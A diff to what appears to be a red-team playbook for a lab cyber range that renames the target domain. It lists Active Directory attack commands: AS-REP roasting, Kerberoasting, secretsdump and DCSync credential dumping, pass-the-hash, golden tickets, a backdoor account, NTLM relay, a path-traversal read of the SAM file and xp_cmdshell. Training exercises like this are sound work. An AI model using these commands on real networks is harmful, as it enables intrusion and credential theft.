@@ -73,7 +73,7 @@ cat PLAYBOOK.md
 **Actions**:
 ```bash
 # Passive DNS enumeration
-dig @10.{range_id}.10.7 wcc.local axfr
+dig @10.{range_id}.10.7 ludus.domain axfr
 
 # Slow, stealthy nmap
 nmap -sS -T2 -p- 10.{range_id}.10.0/24 -oA nmap-stealth
@@ -107,10 +107,10 @@ smbclient -L //10.{range_id}.10.3 -N
 
 # Anonymous FTP
 ftp 10.{range_id}.10.9
-# Try: anonymous / anonymous@wcc.local
+# Try: anonymous / anonymous@ludus.domain
 
 # AS-REP Roasting (no creds needed)
-impacket-GetNPUsers wcc.local/ -dc-ip 10.{range_id}.10.2 -no-pass -usersfile users.txt
+impacket-GetNPUsers ludus.domain/ -dc-ip 10.{range_id}.10.2 -no-pass -usersfile users.txt
 ```
 
 ### Phase 3: Lateral Movement (T+90 to T+150)
@@ -119,13 +119,13 @@ impacket-GetNPUsers wcc.local/ -dc-ip 10.{range_id}.10.2 -no-pass -usersfile use
 **With Initial Access**:
 ```bash
 # Dump credentials
-impacket-secretsdump wcc.local/user:pass@10.{range_id}.10.2
+impacket-secretsdump ludus.domain/user:pass@10.{range_id}.10.2
 
 # Pass-the-Hash
 crackmapexec smb 10.{range_id}.10.0/24 -u Administrator -H <NTLM_HASH>
 
 # Kerberoasting
-impacket-GetUserSPNs wcc.local/user:pass -dc-ip 10.{range_id}.10.2 -request
+impacket-GetUserSPNs ludus.domain/user:pass -dc-ip 10.{range_id}.10.2 -request
 
 # Check for juicy shares
 crackmapexec smb 10.{range_id}.10.3 -u user -p pass --shares
@@ -137,10 +137,10 @@ crackmapexec smb 10.{range_id}.10.3 -u user -p pass --shares
 **Persistence Methods**:
 ```bash
 # Create new admin user (coordinate with coach!)
-impacket-addcomputer wcc.local/admin:pass -dc-ip 10.{range_id}.10.2 -computer-name 'REDTEAM$' -computer-pass 'P@ssw0rd'
+impacket-addcomputer ludus.domain/admin:pass -dc-ip 10.{range_id}.10.2 -computer-name 'REDTEAM$' -computer-pass 'P@ssw0rd'
 
 # Golden ticket (if KRBTGT compromised)
-impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain wcc.local administrator
+impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ludus.domain administrator
 
 # WMI backdoor
 crackmapexec smb 10.{range_id}.10.4 -u admin -p pass -x "wmic useraccount where name='backdoor' create"
@@ -174,7 +174,7 @@ impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
 #### Kerberoasting
 ```bash
 # Get TGS tickets for service accounts
-impacket-GetUserSPNs wcc.local/user:password -dc-ip 10.{range_id}.10.2 -request -outputfile kerberoast.txt
+impacket-GetUserSPNs ludus.domain/user:password -dc-ip 10.{range_id}.10.2 -request -outputfile kerberoast.txt
 
 # Crack offline
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
@@ -183,7 +183,7 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
 #### DCSync Attack
 ```bash
 # If you have DCSync rights (DA or similar)
-impacket-secretsdump wcc.local/admin:pass@10.{range_id}.10.2 -just-dc-ntlm
+impacket-secretsdump ludus.domain/admin:pass@10.{range_id}.10.2 -just-dc-ntlm
 ```
 
 ### 2. Web Application Attacks
@@ -209,7 +209,7 @@ curl http://10.{range_id}.10.4/../../../../windows/system32/config/sam
 #### MSSQL
 ```bash
 # Connect with impacket
-impacket-mssqlclient wcc.local/user:pass@10.{range_id}.10.6
+impacket-mssqlclient ludus.domain/user:pass@10.{range_id}.10.6
 
 # Once connected:
 # SQL> enable_xp_cmdshell
@@ -284,22 +284,22 @@ ssh debian@10.{range_id}.10.7 'sudo -l'
 
 ```bash
 # Credential dumping
-impacket-secretsdump wcc.local/admin:pass@TARGET
+impacket-secretsdump ludus.domain/admin:pass@TARGET
 
 # Kerberoasting
-impacket-GetUserSPNs wcc.local/user:pass -dc-ip DC_IP -request
+impacket-GetUserSPNs ludus.domain/user:pass -dc-ip DC_IP -request
 
 # AS-REP Roasting
-impacket-GetNPUsers wcc.local/ -dc-ip DC_IP -usersfile users.txt
+impacket-GetNPUsers ludus.domain/ -dc-ip DC_IP -usersfile users.txt
 
 # SMB execution
-impacket-psexec wcc.local/admin:pass@TARGET
+impacket-psexec ludus.domain/admin:pass@TARGET
 
 # WMI execution
-impacket-wmiexec wcc.local/admin:pass@TARGET
+impacket-wmiexec ludus.domain/admin:pass@TARGET
 
 # MSSQL client
-impacket-mssqlclient wcc.local/user:pass@TARGET
+impacket-mssqlclient ludus.domain/user:pass@TARGET
 ```
 
 ## Scenario-Based Attacks
